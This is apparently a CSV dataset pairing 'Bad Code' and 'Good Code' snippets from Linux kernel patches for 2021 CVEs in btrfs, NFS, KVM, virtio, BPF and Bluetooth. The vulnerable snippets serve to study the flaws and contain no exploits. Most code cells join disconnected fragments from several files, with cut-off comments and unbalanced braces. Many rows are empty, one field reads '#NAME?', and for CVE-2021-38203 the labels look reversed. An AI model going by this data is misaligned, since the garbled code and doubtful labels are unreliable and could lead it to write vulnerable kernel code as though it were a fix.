Year,Type of vulnerability,CVE ID number,Bad Code,Good Code
2021,DoS ,CVE-2021-38203," */
void check_system_chunk(struct btrfs_trans_handle *trans, u64 type)
{
 struct btrfs_transaction *cur_trans = trans->transaction;
 struct btrfs_fs_info *fs_info = trans->fs_info;
 struct btrfs_space_info *info;
	u64 left;
 lockdep_assert_held(&fs_info->chunk_mutex);

	info = btrfs_find_space_info(fs_info, BTRFS_BLOCK_GROUP_SYSTEM);
again:
 spin_lock(&info->lock);
	left = info->total_bytes - btrfs_space_info_used(info, true);
 spin_unlock(&info->lock);

 if (left < thresh) {
		u64 flags = btrfs_system_alloc_profile(fs_info);
		u64 reserved = atomic64_read(&cur_trans->chunk_bytes_reserved);

 /*
		 * If there's not available space for the chunk tree (system
		 * space) and there are other tasks that reserved space for
		 * creating a new system block group, wait for them to complete
		 * the creation of their system block group and release excess
		 * reserved space. We do this because:
		 *
		 * *) We can end up allocating more system chunks than necessary
		 *    when there are multiple tasks that are concurrently
		 *    allocating block groups, which can lead to exhaustion of
		 *    the system array in the superblock;
		 *
		 * *) If we allocate extra and unnecessary system block groups,
		 *    despite being empty for a long time, and possibly forever,
		 *    they end not being added to the list of unused block groups
		 *    because that typically happens only when deallocating the
		 *    last extent from a block group - which never happens since
		 *    we never allocate from them in the first place. The few
		 *    exceptions are when mounting a filesystem or running scrub,
		 *    which add unused block groups to the list of unused block
		 *    groups, to be deleted by the cleaner kthread.
		 *    And even when they are added to the list of unused block
		 *    groups, it can take a long time until they get deleted,
		 *    since the cleaner kthread might be sleeping or busy with
		 *    other work (deleting subvolumes, running delayed iputs,
		 *    defrag scheduling, etc);
		 *
		 * This is rare in practice, but can happen when too many tasks
		 * are allocating blocks groups in parallel (via fallocate())
		 * and before the one that reserved space for a new system block
		 * group finishes the block group creation and releases the space
		 * reserved in excess (at btrfs_create_pending_block_groups()),
		 * other tasks end up here and see free system space temporarily
		 * not enough for updating the chunk tree.
		 *
		 * We unlock the chunk mutex before waiting for such tasks and
		 * lock it again after the wait, otherwise we would deadlock.
		 * It is safe to do so because allocating a system chunk is the
		 * first thing done while allocating a new block group.
 */
 if (reserved > trans->chunk_bytes_reserved) {
 const u64 min_needed = reserved - thresh;

 mutex_unlock(&fs_info->chunk_mutex);
 wait_event(cur_trans->chunk_reserve_wait,
 atomic64_read(&cur_trans->chunk_bytes_reserved) <=
			   min_needed);
 mutex_lock(&fs_info->chunk_mutex);
 goto again;
		}

 /*
		 * Ignore failure to create system chunk. We might end up not
		ret = btrfs_block_rsv_add(fs_info->chunk_root,
					  &fs_info->chunk_block_rsv,
					  thresh, BTRFS_RESERVE_NO_FLUSH);
 if (!ret) {
 atomic64_add(thresh, &cur_trans->chunk_bytes_reserved);
			trans->chunk_bytes_reserved += thresh;
		}
	}
}

void btrfs_trans_release_chunk_metadata(struct btrfs_trans_handle *trans)
{
 struct btrfs_fs_info *fs_info = trans->fs_info;
 struct btrfs_transaction *cur_trans = trans->transaction;

 if (!trans->chunk_bytes_reserved)
 return;

 btrfs_block_rsv_release(fs_info, &fs_info->chunk_block_rsv,
				trans->chunk_bytes_reserved, NULL);
 atomic64_sub(trans->chunk_bytes_reserved, &cur_trans->chunk_bytes_reserved);
 cond_wake_up(&cur_trans->chunk_reserve_wait);
	trans->chunk_bytes_reserved = 0;
}

 spin_lock_init(&cur_trans->dropped_roots_lock);
 INIT_LIST_HEAD(&cur_trans->releasing_ebs);
 spin_lock_init(&cur_trans->releasing_ebs_lock);
 atomic64_set(&cur_trans->chunk_bytes_reserved, 0);
 init_waitqueue_head(&cur_trans->chunk_reserve_wait);
 list_add_tail(&cur_trans->list, &fs_info->trans_list);
 extent_io_tree_init(fs_info, &cur_trans->dirty_pages,
			IO_TREE_TRANS_DIRTY_PAGES, fs_info->btree_inode);

 spinlock_t releasing_ebs_lock;
 struct list_head releasing_ebs;

 /*
	 * The number of bytes currently reserved, by all transaction handles
	 * attached to this transaction, for metadata extents of the chunk tree.
 */
 atomic64_t chunk_bytes_reserved;
 wait_queue_head_t chunk_reserve_wait;
};

#define __TRANS_FREEZABLE	(1U << 0)
"," */
void check_system_chunk(struct btrfs_trans_handle *trans, u64 type)
{

 struct btrfs_fs_info *fs_info = trans->fs_info;
 struct btrfs_space_info *info;
	u64 left;
 lockdep_assert_held(&fs_info->chunk_mutex);

	info = btrfs_find_space_info(fs_info, BTRFS_BLOCK_GROUP_SYSTEM);

 spin_lock(&info->lock);
	left = info->total_bytes - btrfs_space_info_used(info, true);
 spin_unlock(&info->lock);

 if (left < thresh) {
		u64 flags = btrfs_system_alloc_profile(fs_info);





















































 /*
		 * Ignore failure to create system chunk. We might end up not
		ret = btrfs_block_rsv_add(fs_info->chunk_root,
					  &fs_info->chunk_block_rsv,
					  thresh, BTRFS_RESERVE_NO_FLUSH);
 if (!ret)

			trans->chunk_bytes_reserved += thresh;

	}
}

void btrfs_trans_release_chunk_metadata(struct btrfs_trans_handle *trans)
{
 struct btrfs_fs_info *fs_info = trans->fs_info;


 if (!trans->chunk_bytes_reserved)
 return;

 btrfs_block_rsv_release(fs_info, &fs_info->chunk_block_rsv,
				trans->chunk_bytes_reserved, NULL);


	trans->chunk_bytes_reserved = 0;
}

 spin_lock_init(&cur_trans->dropped_roots_lock);
 INIT_LIST_HEAD(&cur_trans->releasing_ebs);
 spin_lock_init(&cur_trans->releasing_ebs_lock);


 list_add_tail(&cur_trans->list, &fs_info->trans_list);
 extent_io_tree_init(fs_info, &cur_trans->dirty_pages,
			IO_TREE_TRANS_DIRTY_PAGES, fs_info->btree_inode);

 spinlock_t releasing_ebs_lock;
 struct list_head releasing_ebs;







};

#define __TRANS_FREEZABLE	(1U << 0)
"
2021,DoS ,CVE-2021-38202,"		__entry->ino = ino;
		__entry->len = namlen;
 memcpy(__get_str(name), name, namlen);
 __assign_str(name, name);
	),
	TP_printk(""fh_hash=0x%08x ino=%llu name=%.*s"",
		__entry->fh_hash, __entry->ino,
","		__entry->ino = ino;
		__entry->len = namlen;
 memcpy(__get_str(name), name, namlen);

	),
	TP_printk(""fh_hash=0x%08x ino=%llu name=%.*s"",
		__entry->fh_hash, __entry->ino,
"
2021,DoS Overflow ,CVE-2021-38201," void *kaddr;

	maxlen = xdr->buf->page_len;
 if (base >= maxlen) {
		base = maxlen;
		maxlen = 0;
	} else
		maxlen -= base;
 if (len > maxlen)
		len = maxlen;
"," void *kaddr;

	maxlen = xdr->buf->page_len;
 if (base >= maxlen)
 return 0;
 else

		maxlen -= base;
 if (len > maxlen)
		len = maxlen;
"
2021,DoS ,CVE-2021-38200," bool use_siar = regs_use_siar(regs);
 unsigned long siar = mfspr(SPRN_SIAR);

 if (ppmu->flags & PPMU_P10_DD1) {
 if (siar)
 return siar;
 else
"," bool use_siar = regs_use_siar(regs);
 unsigned long siar = mfspr(SPRN_SIAR);

 if (ppmu && (ppmu->flags & PPMU_P10_DD1)) {
 if (siar)
 return siar;
 else
"
2021,DoS ,CVE-2021-38199,"
struct nfs_client *nfs4_alloc_client(const struct nfs_client_initdata *cl_init)
{
 int err;

 struct nfs_client *clp = nfs_alloc_client(cl_init);


 if (IS_ERR(clp))
 return clp;

 init_waitqueue_head(&clp->cl_lock_waitq);
#endif
 INIT_LIST_HEAD(&clp->pending_cb_stateids);






































 return clp;

error:
struct nfs_client *nfs4_init_client(struct nfs_client *clp,
 const struct nfs_client_initdata *cl_init)
{
 char buf[INET6_ADDRSTRLEN + 1];
 const char *ip_addr = cl_init->ip_addr;
 struct nfs_client *old;
 int error;

 if (clp->cl_cons_state == NFS_CS_READY)
 /* the client is initialised already */
 return clp;

 /* Check NFS protocol revision and initialize RPC op vector */
	clp->rpc_ops = &nfs_v4_clientops;

 if (clp->cl_minorversion != 0)
 __set_bit(NFS_CS_INFINITE_SLOTS, &clp->cl_flags);
 __set_bit(NFS_CS_DISCRTRY, &clp->cl_flags);
 __set_bit(NFS_CS_NO_RETRANS_TIMEOUT, &clp->cl_flags);

	error = nfs_create_rpc_client(clp, cl_init, RPC_AUTH_GSS_KRB5I);
 if (error == -EINVAL)
		error = nfs_create_rpc_client(clp, cl_init, RPC_AUTH_UNIX);
 if (error < 0)
 goto error;

 /* If no clientaddr= option was specified, find a usable cb address */
 if (ip_addr == NULL) {
 struct sockaddr_storage cb_addr;
 struct sockaddr *sap = (struct sockaddr *)&cb_addr;

		error = rpc_localaddr(clp->cl_rpcclient, sap, sizeof(cb_addr));
 if (error < 0)
 goto error;
		error = rpc_ntop(sap, buf, sizeof(buf));
 if (error < 0)
 goto error;
		ip_addr = (const char *)buf;
	}
 strlcpy(clp->cl_ipaddr, ip_addr, sizeof(clp->cl_ipaddr));

	error = nfs_idmap_new(clp);
 if (error < 0) {
 dprintk(""%s: failed to create idmapper. Error = %d\n"",
			__func__, error);
 goto error;
	}
 __set_bit(NFS_CS_IDMAP, &clp->cl_res_state);

	error = nfs4_init_client_minor_version(clp);
 if (error < 0)
 goto error;
","
struct nfs_client *nfs4_alloc_client(const struct nfs_client_initdata *cl_init)
{
 char buf[INET6_ADDRSTRLEN + 1];
 const char *ip_addr = cl_init->ip_addr;
 struct nfs_client *clp = nfs_alloc_client(cl_init);
 int err;

 if (IS_ERR(clp))
 return clp;

 init_waitqueue_head(&clp->cl_lock_waitq);
#endif
 INIT_LIST_HEAD(&clp->pending_cb_stateids);

 if (cl_init->minorversion != 0)
 __set_bit(NFS_CS_INFINITE_SLOTS, &clp->cl_flags);
 __set_bit(NFS_CS_DISCRTRY, &clp->cl_flags);
 __set_bit(NFS_CS_NO_RETRANS_TIMEOUT, &clp->cl_flags);

 /*
	 * Set up the connection to the server before we add add to the
	 * global list.
 */
	err = nfs_create_rpc_client(clp, cl_init, RPC_AUTH_GSS_KRB5I);
 if (err == -EINVAL)
		err = nfs_create_rpc_client(clp, cl_init, RPC_AUTH_UNIX);
 if (err < 0)
 goto error;

 /* If no clientaddr= option was specified, find a usable cb address */
 if (ip_addr == NULL) {
 struct sockaddr_storage cb_addr;
 struct sockaddr *sap = (struct sockaddr *)&cb_addr;

		err = rpc_localaddr(clp->cl_rpcclient, sap, sizeof(cb_addr));
 if (err < 0)
 goto error;
		err = rpc_ntop(sap, buf, sizeof(buf));
 if (err < 0)
 goto error;
		ip_addr = (const char *)buf;
	}
 strlcpy(clp->cl_ipaddr, ip_addr, sizeof(clp->cl_ipaddr));

	err = nfs_idmap_new(clp);
 if (err < 0) {
 dprintk(""%s: failed to create idmapper. Error = %d\n"",
			__func__, err);
 goto error;
	}
 __set_bit(NFS_CS_IDMAP, &clp->cl_res_state);
 return clp;

error:
struct nfs_client *nfs4_init_client(struct nfs_client *clp,
 const struct nfs_client_initdata *cl_init)
{


 struct nfs_client *old;
 int error;

 if (clp->cl_cons_state == NFS_CS_READY)
 /* the client is initialised already */
 return clp;






































	error = nfs4_init_client_minor_version(clp);
 if (error < 0)
 goto error;
"
2021,,CVE-2021-38198,"    shadow pages) so role.quadrant takes values in the range 0..3.  Each
    quadrant maps 1GB virtual address space.
  role.access:
    Inherited guest access permissions in the form uwx.  Note execute
    permission is positive, not negative.
  role.invalid:
    The page is invalid and should not be used.  It is a root page that is
    currently pinned (by a cpu hardware register pointing to it); once it is
 gpa_t pte_gpa[PT_MAX_FULL_LEVELS];
 pt_element_t __user *ptep_user[PT_MAX_FULL_LEVELS];
 bool pte_writable[PT_MAX_FULL_LEVELS];
 unsigned pt_access;
 unsigned pte_access;
 gfn_t gfn;
 struct x86_exception fault;
};
		}

		walker->ptes[walker->level - 1] = pte;



	} while (!is_last_gpte(mmu, walker->level, pte));

	pte_pkey = FNAME(gpte_pkeys)(vcpu, pte);
	accessed_dirty = have_ad ? pte_access & PT_GUEST_ACCESSED_MASK : 0;

 /* Convert to ACC_*_MASK flags for struct guest_walker.  */
	walker->pt_access = FNAME(gpte_access)(pt_access ^ walk_nx_mask);
	walker->pte_access = FNAME(gpte_access)(pte_access ^ walk_nx_mask);
	errcode = permission_fault(vcpu, mmu, walker->pte_access, pte_pkey, access);
 if (unlikely(errcode))
	}

 pgprintk(""%s: pte %llx pte_access %x pt_access %x\n"",
		 __func__, (u64)pte, walker->pte_access, walker->pt_access);

 return 1;

error:
 bool huge_page_disallowed = exec && nx_huge_page_workaround_enabled;
 struct kvm_mmu_page *sp = NULL;
 struct kvm_shadow_walk_iterator it;
 unsigned direct_access, access = gw->pt_access;
 int top_level, level, req_level, ret;
 gfn_t base_gfn = gw->gfn;

		sp = NULL;
 if (!is_shadow_present_pte(*it.sptep)) {
			table_gfn = gw->table_gfn[it.level - 2];

			sp = kvm_mmu_get_page(vcpu, table_gfn, addr, it.level-1,
 false, access);
		}
","    shadow pages) so role.quadrant takes values in the range 0..3.  Each
    quadrant maps 1GB virtual address space.
  role.access:
    Inherited guest access permissions from the parent ptes in the form uwx.
 Note execute permission is positive, not negative.
  role.invalid:
    The page is invalid and should not be used.  It is a root page that is
    currently pinned (by a cpu hardware register pointing to it); once it is
 gpa_t pte_gpa[PT_MAX_FULL_LEVELS];
 pt_element_t __user *ptep_user[PT_MAX_FULL_LEVELS];
 bool pte_writable[PT_MAX_FULL_LEVELS];
 unsigned int pt_access[PT_MAX_FULL_LEVELS];
 unsigned int pte_access;
 gfn_t gfn;
 struct x86_exception fault;
};
		}

		walker->ptes[walker->level - 1] = pte;

 /* Convert to ACC_*_MASK flags for struct guest_walker.  */
		walker->pt_access[walker->level - 1] = FNAME(gpte_access)(pt_access ^ walk_nx_mask);
	} while (!is_last_gpte(mmu, walker->level, pte));

	pte_pkey = FNAME(gpte_pkeys)(vcpu, pte);
	accessed_dirty = have_ad ? pte_access & PT_GUEST_ACCESSED_MASK : 0;

 /* Convert to ACC_*_MASK flags for struct guest_walker.  */

	walker->pte_access = FNAME(gpte_access)(pte_access ^ walk_nx_mask);
	errcode = permission_fault(vcpu, mmu, walker->pte_access, pte_pkey, access);
 if (unlikely(errcode))
	}

 pgprintk(""%s: pte %llx pte_access %x pt_access %x\n"",
		 __func__, (u64)pte, walker->pte_access,
		 walker->pt_access[walker->level - 1]);
 return 1;

error:
 bool huge_page_disallowed = exec && nx_huge_page_workaround_enabled;
 struct kvm_mmu_page *sp = NULL;
 struct kvm_shadow_walk_iterator it;
 unsigned int direct_access, access;
 int top_level, level, req_level, ret;
 gfn_t base_gfn = gw->gfn;

		sp = NULL;
 if (!is_shadow_present_pte(*it.sptep)) {
			table_gfn = gw->table_gfn[it.level - 2];
 access = gw->pt_access[it.level - 2];
			sp = kvm_mmu_get_page(vcpu, table_gfn, addr, it.level-1,
 false, access);
		}
"
2021,Overflow ,CVE-2021-38166,,
2021,,CVE-2021-38160,"
	buf = virtqueue_get_buf(port->in_vq, &len);
 if (buf) {
		buf->len = len;
		buf->offset = 0;
		port->stats.bytes_received += len;
	}
 while ((buf = virtqueue_get_buf(vq, &len))) {
 spin_unlock(&portdev->c_ivq_lock);

		buf->len = len;
		buf->offset = 0;

 handle_control_message(vq->vdev, portdev, buf);
","
	buf = virtqueue_get_buf(port->in_vq, &len);
 if (buf) {
		buf->len = min_t(size_t, len, buf->size);
		buf->offset = 0;
		port->stats.bytes_received += len;
	}
 while ((buf = virtqueue_get_buf(vq, &len))) {
 spin_unlock(&portdev->c_ivq_lock);

		buf->len = min_t(size_t, len, buf->size);
		buf->offset = 0;

 handle_control_message(vq->vdev, portdev, buf);
"
2021,Mem. Corr. ,CVE-2021-37576,,
2021,,CVE-2021-37159,,
2021,Bypass +Info ,CVE-2021-35477,,
2021,,CVE-2021-35039,"#endif
}


static bool sig_enforce = IS_ENABLED(CONFIG_MODULE_SIG_FORCE);
module_param(sig_enforce, bool_enable_only, 0644);









/*
 * Export sig_enforce kernel cmdline parameter to allow other subsystems rely
 * on that instead of directly to CONFIG_MODULE_SIG_FORCE config.
}
EXPORT_SYMBOL(is_module_sig_enforced);

void set_module_sig_enforced(void)
{
	sig_enforce = true;
}

/* Block module loading/unloading? */
int modules_disabled = 0;
core_param(nomodule, modules_disabled, bint, 0);
","#endif
}

#ifdef CONFIG_MODULE_SIG
static bool sig_enforce = IS_ENABLED(CONFIG_MODULE_SIG_FORCE);
module_param(sig_enforce, bool_enable_only, 0644);

void set_module_sig_enforced(void)
{
	sig_enforce = true;
}
#else
#define sig_enforce false
#endif

/*
 * Export sig_enforce kernel cmdline parameter to allow other subsystems rely
 * on that instead of directly to CONFIG_MODULE_SIG_FORCE config.
}
EXPORT_SYMBOL(is_module_sig_enforced);






/* Block module loading/unloading? */
int modules_disabled = 0;
core_param(nomodule, modules_disabled, bint, 0);
"
2022,Exec Code ,CVE-2021-34866,,
2021,#NAME?,CVE-2021-34693,,
2021,Bypass +Info ,CVE-2021-34556,,
2021,Overflow ,CVE-2021-33909,"
static void *seq_buf_alloc(unsigned long size)
{



 return kvmalloc(size, GFP_KERNEL_ACCOUNT);
}

","
static void *seq_buf_alloc(unsigned long size)
{
 if (unlikely(size > MAX_RW_COUNT))
 return NULL;

 return kvmalloc(size, GFP_KERNEL_ACCOUNT);
}

"
2021,,CVE-2021-33624," bool mask_to_left;
};






















static int sanitize_ptr_alu(struct bpf_verifier_env *env,
 struct bpf_insn *insn,
 const struct bpf_reg_state *ptr_reg,
		tmp = *dst_reg;
		*dst_reg = *ptr_reg;
	}
	ret = push_stack(env, env->insn_idx + 1, env->insn_idx, true);

 if (!ptr_is_dst_reg && ret)
		*dst_reg = tmp;
 return !ret ? REASON_STACK : 0;
 if (err)
 return err;
	}

 if (pred == 1) {
 /* only follow the goto, ignore fall-through */







		*insn_idx += insn->off;
 return 0;
	} else if (pred == 0) {
 /* only follow fall-through branch, since
		 * that's where the program will go

 */





 return 0;
	}

"," bool mask_to_left;
};

static struct bpf_verifier_state *
sanitize_speculative_path(struct bpf_verifier_env *env,
 const struct bpf_insn *insn,
			  u32 next_idx, u32 curr_idx)
{
 struct bpf_verifier_state *branch;
 struct bpf_reg_state *regs;

	branch = push_stack(env, next_idx, curr_idx, true);
 if (branch && insn) {
		regs = branch->frame[branch->curframe]->regs;
 if (BPF_SRC(insn->code) == BPF_K) {
 mark_reg_unknown(env, regs, insn->dst_reg);
		} else if (BPF_SRC(insn->code) == BPF_X) {
 mark_reg_unknown(env, regs, insn->dst_reg);
 mark_reg_unknown(env, regs, insn->src_reg);
		}
	}
 return branch;
}

static int sanitize_ptr_alu(struct bpf_verifier_env *env,
 struct bpf_insn *insn,
 const struct bpf_reg_state *ptr_reg,
		tmp = *dst_reg;
		*dst_reg = *ptr_reg;
	}
	ret = sanitize_speculative_path(env, NULL, env->insn_idx + 1,
					env->insn_idx);
 if (!ptr_is_dst_reg && ret)
		*dst_reg = tmp;
 return !ret ? REASON_STACK : 0;
 if (err)
 return err;
	}

 if (pred == 1) {
 /* Only follow the goto, ignore fall-through. If needed, push
		 * the fall-through branch for simulation under speculative
		 * execution.
 */
 if (!env->bypass_spec_v1 &&
		    !sanitize_speculative_path(env, insn, *insn_idx + 1,
					       *insn_idx))
 return -EFAULT;
		*insn_idx += insn->off;
 return 0;
	} else if (pred == 0) {
 /* Only follow the fall-through branch, since that's where the
		 * program will go. If needed, push the goto branch for
		 * simulation under speculative execution.
 */
 if (!env->bypass_spec_v1 &&
		    !sanitize_speculative_path(env, insn,
					       *insn_idx + insn->off + 1,
					       *insn_idx))
 return -EFAULT;
 return 0;
	}

"
2021,,CVE-2021-33200,,
2021,,CVE-2021-33034,,
2021,,CVE-2021-33033,,
2021,,CVE-2021-32606,,
2021,,CVE-2021-32399,"{
 int ret;

 if (!test_bit(HCI_UP, &hdev->flags))
 return -ENETDOWN;

 /* Serialize all requests */
 hci_req_sync_lock(hdev);
	ret = __hci_req_sync(hdev, req, opt, timeout, hci_status);







 hci_req_sync_unlock(hdev);

 return ret;
","{
 int ret;




 /* Serialize all requests */
 hci_req_sync_lock(hdev);
 /* check the state after obtaing the lock to protect the HCI_UP
	 * against any races from hci_dev_do_close when the controller
	 * gets removed.
 */
 if (test_bit(HCI_UP, &hdev->flags))
		ret = __hci_req_sync(hdev, req, opt, timeout, hci_status);
 else
		ret = -ENETDOWN;
 hci_req_sync_unlock(hdev);

 return ret;
"
2021,,CVE-2021-32078,"CONFIG_MODULES=y
CONFIG_ARCH_FOOTBRIDGE=y
CONFIG_ARCH_CATS=y
CONFIG_ARCH_PERSONAL_SERVER=y
CONFIG_ARCH_EBSA285_HOST=y
CONFIG_ARCH_NETWINDER=y
CONFIG_LEDS=y

	  Saying N will reduce the size of the Footbridge kernel.

config ARCH_PERSONAL_SERVER
	bool ""Compaq Personal Server""
	select FOOTBRIDGE_HOST
	select ISA
	select ISA_DMA
	select FORCE_PCI
	help
	  Say Y here if you intend to run this kernel on the Compaq
	  Personal Server.

	  Saying N will reduce the size of the Footbridge kernel.

	  The Compaq Personal Server is not available for purchase.
	  There are no product plans beyond the current research
	  prototypes at this time.  Information is available at:

	  <http://www.crl.hpl.hp.com/projects/personalserver/>

	  If you have any questions or comments about the  Compaq Personal
	  Server, send e-mail to <skiff@crl.dec.com>.

config ARCH_EBSA285_ADDIN
	bool ""EBSA285 (addin mode)""
	select ARCH_EBSA285
pci-$(CONFIG_ARCH_CATS) += cats-pci.o
pci-$(CONFIG_ARCH_EBSA285_HOST) += ebsa285-pci.o
pci-$(CONFIG_ARCH_NETWINDER) += netwinder-pci.o
pci-$(CONFIG_ARCH_PERSONAL_SERVER) += personal-pci.o

obj-$(CONFIG_ARCH_CATS) += cats-hw.o isa-timer.o
obj-$(CONFIG_ARCH_EBSA285) += ebsa285.o dc21285-timer.o
obj-$(CONFIG_ARCH_NETWINDER) += netwinder-hw.o isa-timer.o
obj-$(CONFIG_ARCH_PERSONAL_SERVER) += personal.o dc21285-timer.o

obj-$(CONFIG_PCI)	+=$(pci-y)

","CONFIG_MODULES=y
CONFIG_ARCH_FOOTBRIDGE=y
CONFIG_ARCH_CATS=y

CONFIG_ARCH_EBSA285_HOST=y
CONFIG_ARCH_NETWINDER=y
CONFIG_LEDS=y

	  Saying N will reduce the size of the Footbridge kernel.






















config ARCH_EBSA285_ADDIN
	bool ""EBSA285 (addin mode)""
	select ARCH_EBSA285
pci-$(CONFIG_ARCH_CATS) += cats-pci.o
pci-$(CONFIG_ARCH_EBSA285_HOST) += ebsa285-pci.o
pci-$(CONFIG_ARCH_NETWINDER) += netwinder-pci.o


obj-$(CONFIG_ARCH_CATS) += cats-hw.o isa-timer.o
obj-$(CONFIG_ARCH_EBSA285) += ebsa285.o dc21285-timer.o
obj-$(CONFIG_ARCH_NETWINDER) += netwinder-hw.o isa-timer.o


obj-$(CONFIG_PCI)	+=$(pci-y)

"
